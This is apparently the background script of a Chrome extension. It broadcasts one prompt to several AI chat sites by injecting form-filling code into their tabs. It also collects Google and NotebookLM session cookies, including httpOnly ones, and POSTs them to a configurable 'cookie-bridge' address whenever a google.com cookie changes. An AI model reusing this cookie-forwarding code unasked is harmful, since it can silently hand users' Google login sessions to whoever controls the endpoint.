const SITES = [
  { host: 'chatgpt.com', url: 'https://chatgpt.com/', pattern: 'https://chatgpt.com/*' },
  { host: 'gemini.google.com', url: 'https://gemini.google.com/app', pattern: 'https://gemini.google.com/*' },
  { host: 'claude.ai', url: 'https://claude.ai/chat', pattern: 'https://claude.ai/*' },
  { host: 'midjourney.com', url: 'https://www.midjourney.com/imagine', pattern: 'https://*.midjourney.com/*' }
];

chrome.action.onClicked.addListener(() => {
  chrome.sidePanel.open({ windowId: chrome.windows.WINDOW_ID_CURRENT });
});

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.cmd === 'BROADCAST_PROMPT') {
    broadcast(request)
      .then(() => sendResponse({ ok: true }))
      .catch(err => sendResponse({ ok: false, error: err.message }));
    return true;
  }
  return false;
});

function sendPrompt(text, siteHost) {
  function setNativeValue(element, value) {
    if (element.isContentEditable) {
      element.focus();
      document.execCommand('selectAll', false, null);
      document.execCommand('insertText', false, value);
      return;
    }
    const isTextArea = element.tagName === 'TEXTAREA';
    const proto = isTextArea ? window.HTMLTextAreaElement.prototype : window.HTMLInputElement.prototype;
    const descriptor = Object.getOwnPropertyDescriptor(proto, 'value');
    if (descriptor && descriptor.set) {
      descriptor.set.call(element, value);
    } else {
      element.value = value;
    }
    element.dispatchEvent(new Event('input', { bubbles: true }));
    element.dispatchEvent(new Event('change', { bubbles: true }));
  }
  const ADAPTERS = {
    'chatgpt.com': { promptSelector: '#prompt-textarea', sendSelector: 'button[data-testid="send-button"]' },
    'gemini.google.com': { promptSelector: 'div[contenteditable="true"], textarea', sendSelector: 'button[aria-label="Send message"]' },
    'claude.ai': { promptSelector: 'div[contenteditable="true"]', sendSelector: 'button[aria-label="Send message"], button[aria-label="Send"]' },
    'midjourney.com': {
      promptSelector: 'textarea, input[type="text"], div[contenteditable="true"], [data-testid="prompt-input"], [placeholder*="imagine" i]',
      sendSelector: 'button[type="submit"], button[aria-label="Imagine"], button[aria-label="Create"], button[aria-label="Generate"], [data-testid="imagine-button"], [data-testid="generate-button"]'
    }
  };
  const host = location.hostname;
  const site = Object.keys(ADAPTERS).find(h => host === h || host.endsWith('.' + h));
  if (!site) return { ok: false, error: 'no adapter for ' + host };
  const adapter = ADAPTERS[site];
  const el = document.querySelector(adapter.promptSelector);
  if (!el) return { ok: false, error: 'prompt not found', site, host };
  setNativeValue(el, text);
  const btn = document.querySelector(adapter.sendSelector);
  if (!btn) return { ok: false, error: 'send button not found', site, host };
  if (!btn.disabled) btn.click();
  return { ok: true, site, host };
}

async function broadcast({ text, targets }) {
  const list = targets?.length
    ? SITES.filter(s => targets.includes(s.host))
    : SITES;

  for (const site of list) {
    const allTabs = await chrome.tabs.query({});
    const existing = allTabs.find(t => t.url && t.url.includes(site.host));
    const tab = existing || await chrome.tabs.create({ url: site.url, active: false });
    if (!existing) await waitForTab(tab.id);
    try {
      const res = await chrome.scripting.executeScript({
        target: { tabId: tab.id },
        func: sendPrompt,
        args: [text, site.host]
      });
      const result = res?.[0]?.result;
      if (!result?.ok) throw new Error(result?.error || 'unknown');
      console.log('sent to', site.host, result);
    } catch (err) {
      console.error(`Failed to send to ${site.host}:`, err);
    }
  }
}

function waitForTab(tabId) {
  return new Promise(resolve => {
    const listener = (id, info) => {
      if (id === tabId && info.status === 'complete') {
        chrome.tabs.onUpdated.removeListener(listener);
        setTimeout(resolve, 800);
      }
    };
    chrome.tabs.onUpdated.addListener(listener);
  });
}

const NOTEBOOKLM_URLS = [
  'https://notebooklm.google.com/',
  'https://notebook.google.com/',
  'https://accounts.google.com/'
];

function mapSameSite(value) {
  if (value === 'strict') return 'Strict';
  if (value === 'lax') return 'Lax';
  if (value === 'no_restriction') return 'None';
  return 'Lax';
}

function formatCookie(c) {
  return {
    name: c.name,
    value: c.value,
    domain: c.domain,
    path: c.path,
    expires: c.expirationDate ? Math.floor(c.expirationDate) : -1,
    httpOnly: !!c.httpOnly,
    secure: !!c.secure,
    sameSite: mapSameSite(c.sameSite)
  };
}

function getCookiesForUrl(url) {
  return new Promise((resolve, reject) => {
    chrome.cookies.getAll({ url }, cookies => {
      if (chrome.runtime.lastError) return reject(new Error(chrome.runtime.lastError.message));
      resolve(cookies || []);
    });
  });
}

function captureAndSendCookies() {
  chrome.storage.local.get('bridgeUrl', async ({ bridgeUrl }) => {
    const url = (bridgeUrl || 'http://127.0.0.1:9876').replace(/\/+$/, '');
    const sets = await Promise.all(NOTEBOOKLM_URLS.map(u => getCookiesForUrl(u)));
    const seen = new Set();
    const cookies = [];
    for (const set of sets) {
      for (const c of set) {
        const key = `${c.name}|${c.domain}|${c.path}`;
        if (seen.has(key)) continue;
        seen.add(key);
        cookies.push(formatCookie(c));
      }
    }
    try {
      const res = await fetch(`${url}/cookies`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cookies })
      });
      if (!res.ok) console.error('cookie-bridge returned', res.status, await res.text());
      else console.log('cookie-bridge updated with', cookies.length, 'cookies');
    } catch (err) {
      console.error('cookie-bridge error:', err.message);
    }
  });
}

let lastCookieSend = 0;
const COOKIE_SEND_COOLDOWN = 60_000;

function isRelevantCookie(cookie) {
  return cookie && cookie.domain && /(?:^|\.)google\.com$/.test(cookie.domain);
}

chrome.cookies.onChanged.addListener(changeInfo => {
  if (!isRelevantCookie(changeInfo.cookie)) return;
  const now = Date.now();
  if (now - lastCookieSend < COOKIE_SEND_COOLDOWN) return;
  lastCookieSend = now;
  captureAndSendCookies();
});
